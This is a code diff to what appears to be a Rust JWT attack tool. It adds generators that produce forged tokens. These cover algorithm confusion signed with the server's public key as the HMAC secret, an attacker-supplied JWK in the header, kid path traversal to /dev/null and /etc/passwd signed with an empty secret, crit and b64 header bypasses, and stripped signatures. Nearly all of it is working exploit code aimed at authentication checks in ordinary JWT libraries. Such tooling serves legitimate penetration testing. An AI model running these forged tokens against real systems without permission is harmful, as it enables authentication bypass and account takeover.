@@ -3,6 +3,7 @@ use anyhow::Result;
 use base64::{engine::general_purpose, Engine};
 use log::info;
 use serde_json::json;
+use zeroize::Zeroize;
 
 /// Extract the claims (second) part from a JWT token string
 fn extract_claims_part(token: &str) -> Result<&str> {
@@ -18,6 +19,33 @@ fn encode_header_with_claims(header: &serde_json::Value, claims_part: &str) -> R
     let header_json = serde_json::to_string(header)?;
     let encoded_header = general_purpose::URL_SAFE_NO_PAD.encode(header_json.as_bytes());
     Ok(format!("{encoded_header}.{claims_part}"))
+}
+
+/// Build a header.payload signing input from a header JSON value and an existing claims part.
+fn signing_input(header: &serde_json::Value, claims_part: &str) -> Result<String> {
+    let header_json = serde_json::to_string(header)?;
+    let encoded_header = general_purpose::URL_SAFE_NO_PAD.encode(header_json.as_bytes());
+    Ok(format!("{encoded_header}.{claims_part}"))
+}
+
+/// Sign an arbitrary signing input with HS256 and return a JWT-formatted token (header.payload.sig).
+fn sign_hs256(signing_input: &str, secret: &[u8]) -> String {
+    let mut mac = hmac_sha256::HMAC::mac(signing_input.as_bytes(), secret);
+    let sig_b64 = general_purpose::URL_SAFE_NO_PAD.encode(mac.as_slice());
+    mac.zeroize();
+    format!("{signing_input}.{sig_b64}")
+}
+
+/// Read the original `alg` value from a JWT header (without verifying anything).
+fn original_alg(token: &str) -> Option<String> {
+    let parts: Vec<&str> = token.split('.').collect();
+    let header_b64 = parts.first()?;
+    let header_bytes = general_purpose::URL_SAFE_NO_PAD.decode(header_b64).ok()?;
+    let header_json: serde_json::Value = serde_json::from_slice(&header_bytes).ok()?;
+    header_json
+        .get("alg")
+        .and_then(|v| v.as_str())
+        .map(|s| s.to_string())
 }
 
 /// Generate none algorithm payloads
@@ -85,24 +113,238 @@ pub fn generate_url_payload(
     Ok(payloads)
 }
 
-/// Generate algorithm confusion attacks (RS256->HS256)
+/// Generate algorithm confusion attacks.
+///
+/// For asymmetric source algorithms (RS*, PS*, ES*, EdDSA) emits a set of header
+/// variants that downgrade to the matching HMAC family plus a `none` downgrade.
+/// If a PEM-encoded public key is provided, additionally produces a fully signed
+/// HMAC token where the **public key bytes are used as the HMAC secret** — the
+/// canonical real-world RS256→HS256 attack. Without the key, the HMAC variants
+/// are emitted unsigned (header.payload only) so callers can re-sign once they
+/// recover the server's public key.
 pub fn generate_alg_confusion_payload(
     token: &str,
     public_key: Option<&str>,
 ) -> Result<Vec<String>> {
     let claims_part = extract_claims_part(token)?;
-    let _ = public_key;
 
-    // Basic alg change from RS256 to HS256
-    let header = json!({
-        "alg": "HS256",
-        "typ": "JWT"
+    let source_alg = original_alg(token).unwrap_or_else(|| "RS256".to_string());
+    let source_upper = source_alg.to_uppercase();
+
+    // Pick target HMAC algorithm matching the source's hash size.
+    let hmac_target = match source_upper.as_str() {
+        "RS384" | "PS384" | "ES384" => "HS384",
+        "RS512" | "PS512" | "ES512" => "HS512",
+        // RS256 / PS256 / ES256 / EdDSA / unknown — default to HS256
+        _ => "HS256",
+    };
+
+    let mut payloads = Vec::new();
+
+    // Header variants — HMAC downgrade and `none` downgrade.
+    let downgrade_algs = [hmac_target, "none"];
+    for alg in downgrade_algs {
+        let header = json!({
+            "alg": alg,
+            "typ": "JWT",
+        });
+        if let Some(pem) = public_key {
+            // Real working attack: sign with the public-key bytes as the HMAC secret.
+            // Only meaningful for HMAC downgrades; skip for `none`.
+            if alg != "none" {
+                let input = signing_input(&header, claims_part)?;
+                let mac = match alg {
+                    "HS256" => {
+                        let mut m = hmac_sha256::HMAC::mac(input.as_bytes(), pem.as_bytes());
+                        let out = m.to_vec();
+                        m.zeroize();
+                        out
+                    }
+                    _ => {
+                        // For HS384/HS512 fall back to the jsonwebtoken crate by
+                        // pretending the PEM bytes are an opaque secret.
+                        let algo = match alg {
+                            "HS384" => jsonwebtoken::Algorithm::HS384,
+                            _ => jsonwebtoken::Algorithm::HS512,
+                        };
+                        let key = jsonwebtoken::EncodingKey::from_secret(pem.as_bytes());
+                        let sig = jsonwebtoken::crypto::sign(input.as_bytes(), &key, algo)?;
+                        // jsonwebtoken returns base64-encoded signature already, decode to bytes
+                        general_purpose::URL_SAFE_NO_PAD.decode(sig.as_bytes())?
+                    }
+                };
+                let sig_b64 = general_purpose::URL_SAFE_NO_PAD.encode(&mac);
+                payloads.push(format!("{input}.{sig_b64}"));
+                continue;
+            }
+        }
+        // Fallback: emit header.payload without signature.
+        payloads.push(encode_header_with_claims(&header, claims_part)?);
+    }
+
+    info!(
+        "Generated algorithm confusion payloads: {} -> {} (+none)",
+        source_upper, hmac_target
+    );
+
+    Ok(payloads)
+}
+
+/// Generate a JWT with an attacker-controlled key embedded in the `jwk` header.
+///
+/// Some libraries trust a JWK supplied directly in the JOSE header as the
+/// verification key. This generates a fresh RSA-2048 key pair, embeds the
+/// public key as a JWK in the header, and signs the token with the matching
+/// private key — producing a fully verifiable attack token.
+pub fn generate_jwk_embed_payload(token: &str) -> Result<String> {
+    use rsa::pkcs8::EncodePrivateKey;
+    use rsa::traits::PublicKeyParts;
+    use rsa::RsaPrivateKey;
+
+    let claims_part = extract_claims_part(token)?;
+
+    let mut rng = rsa::rand_core::OsRng;
+    let private_key = RsaPrivateKey::new(&mut rng, 2048)
+        .map_err(|e| anyhow::anyhow!("Failed to generate RSA key: {}", e))?;
+    let public_key = private_key.to_public_key();
+
+    let n_b64 = general_purpose::URL_SAFE_NO_PAD.encode(public_key.n().to_bytes_be());
+    let e_b64 = general_purpose::URL_SAFE_NO_PAD.encode(public_key.e().to_bytes_be());
+
+    let kid = "jwt-hack-injected";
+    let jwk = json!({
+        "kty": "RSA",
+        "use": "sig",
+        "alg": "RS256",
+        "kid": kid,
+        "n": n_b64,
+        "e": e_b64,
     });
 
-    let payloads = vec![encode_header_with_claims(&header, claims_part)?];
+    let header = json!({
+        "alg": "RS256",
+        "typ": "JWT",
+        "kid": kid,
+        "jwk": jwk,
+    });
 
-    info!("Generated algorithm confusion payloads: RS256->HS256");
+    let input = signing_input(&header, claims_part)?;
+    let pem = private_key
+        .to_pkcs8_pem(rsa::pkcs8::LineEnding::LF)
+        .map_err(|e| anyhow::anyhow!("Failed to export private key: {}", e))?
+        .to_string();
+    let key = jsonwebtoken::EncodingKey::from_rsa_pem(pem.as_bytes())?;
+    let sig_b64 =
+        jsonwebtoken::crypto::sign(input.as_bytes(), &key, jsonwebtoken::Algorithm::RS256)?;
 
+    info!("Generated jwk-embedded RS256 payload (signed with embedded key)");
+
+    Ok(format!("{input}.{sig_b64}"))
+}
+
+/// Generate kid header path-traversal / file-substitution payloads.
+///
+/// When a server resolves the `kid` value as a file path to load a key, an
+/// attacker can substitute a file with known contents (empty for `/dev/null`,
+/// or a predictable file) and forge a valid HMAC signature using those bytes
+/// as the secret. Each payload is fully signed against the substituted "key".
+pub fn generate_kid_traversal_payload(token: &str) -> Result<Vec<String>> {
+    let claims_part = extract_claims_part(token)?;
+
+    // (kid value, secret bytes the server would load when resolving it)
+    let cases: &[(&str, &[u8])] = &[
+        ("/dev/null", b""),
+        ("../../../../../../dev/null", b""),
+        ("..\\..\\..\\..\\..\\dev\\null", b""),
+        ("file:///dev/null", b""),
+        ("/var/empty/null", b""),
+        // Plain read-attempts — sig won't verify but exposes path-traversal/LFI behavior
+        ("../../../../../../etc/passwd", b""),
+        ("/etc/passwd", b""),
+        // Null-byte truncation hint
+        ("legit-key\x00../../../dev/null", b""),
+    ];
+
+    let mut payloads = Vec::with_capacity(cases.len());
+    for (kid, secret) in cases {
+        let header = json!({
+            "alg": "HS256",
+            "typ": "JWT",
+            "kid": kid,
+        });
+        let input = signing_input(&header, claims_part)?;
+        payloads.push(sign_hs256(&input, secret));
+    }
+
+    info!("Generated kid path-traversal payloads (signed with empty secret)");
+    Ok(payloads)
+}
+
+/// Generate `crit` header bypass payloads.
+///
+/// RFC 7515 §4.1.11 requires implementations to reject tokens with unrecognised
+/// `crit` parameters. Libraries that ignore the rule can be tricked into
+/// honouring unknown headers (or skipping signature checks).
+pub fn generate_crit_payload(token: &str) -> Result<Vec<String>> {
+    let claims_part = extract_claims_part(token)?;
+
+    let variants: Vec<serde_json::Value> = vec![
+        json!({ "alg": "HS256", "typ": "JWT", "crit": ["b64"], "b64": false }),
+        json!({ "alg": "HS256", "typ": "JWT", "crit": ["x-custom"], "x-custom": "bypass" }),
+        json!({ "alg": "none", "typ": "JWT", "crit": ["alg"] }),
+        // Empty crit — some libs misparse and skip signature validation
+        json!({ "alg": "HS256", "typ": "JWT", "crit": [] }),
+    ];
+
+    let mut payloads = Vec::with_capacity(variants.len());
+    for header in variants {
+        payloads.push(encode_header_with_claims(&header, claims_part)?);
+    }
+    info!("Generated crit header bypass payloads");
+    Ok(payloads)
+}
+
+/// Generate RFC 7797 unencoded payload (`b64: false`) attack payloads.
+pub fn generate_b64_payload(token: &str) -> Result<Vec<String>> {
+    let claims_part = extract_claims_part(token)?;
+
+    let variants: Vec<serde_json::Value> = vec![
+        json!({ "alg": "HS256", "typ": "JWT", "b64": false, "crit": ["b64"] }),
+        json!({ "alg": "RS256", "typ": "JWT", "b64": false, "crit": ["b64"] }),
+        // b64=false without crit — many libs silently honour it
+        json!({ "alg": "HS256", "typ": "JWT", "b64": false }),
+    ];
+
+    let mut payloads = Vec::with_capacity(variants.len());
+    for header in variants {
+        payloads.push(encode_header_with_claims(&header, claims_part)?);
+    }
+    info!("Generated b64 (RFC 7797) bypass payloads");
+    Ok(payloads)
+}
+
+/// Generate signature-stripped / empty-signature payloads.
+///
+/// Some libraries treat an empty third segment as a valid signature when the
+/// algorithm is not explicitly `none`. The original header is preserved so
+/// the server still sees its expected `alg`.
+pub fn generate_empty_sig_payload(token: &str) -> Result<Vec<String>> {
+    let parts: Vec<&str> = token.split('.').collect();
+    if parts.len() < 2 {
+        return Err(anyhow::anyhow!("Invalid token format"));
+    }
+    let header_b64 = parts[0];
+    let claims_part = parts[1];
+
+    let payloads = vec![
+        // Empty signature segment
+        format!("{header_b64}.{claims_part}."),
+        // No third segment at all
+        format!("{header_b64}.{claims_part}"),
+        // Literal "null" — some JSON-aware parsers accept
+        format!("{header_b64}.{claims_part}.null"),
+    ];
+    info!("Generated signature-stripped payloads");
     Ok(payloads)
 }
 
@@ -258,6 +500,33 @@ pub fn generate_all_payloads(
     if should_generate_all || targets.contains("cty") {
         let cty_payloads = generate_cty_payload(token)?;
         payloads.extend(cty_payloads);
+    }
+
+    // jwk embedded header (real, signed attack)
+    if should_generate_all || targets.contains("jwk_embed") {
+        // This is intentionally allowed to bubble — RSA generation rarely fails.
+        let p = generate_jwk_embed_payload(token)?;
+        payloads.push(p);
+    }
+
+    // kid path-traversal payloads
+    if should_generate_all || targets.contains("kid_traversal") {
+        payloads.extend(generate_kid_traversal_payload(token)?);
+    }
+
+    // crit header bypass payloads
+    if should_generate_all || targets.contains("crit") {
+        payloads.extend(generate_crit_payload(token)?);
+    }
+
+    // RFC 7797 b64=false payloads
+    if should_generate_all || targets.contains("b64") {
+        payloads.extend(generate_b64_payload(token)?);
+    }
+
+    // Empty / stripped signature payloads
+    if should_generate_all || targets.contains("empty_sig") {
+        payloads.extend(generate_empty_sig_payload(token)?);
     }
 
     Ok(payloads)
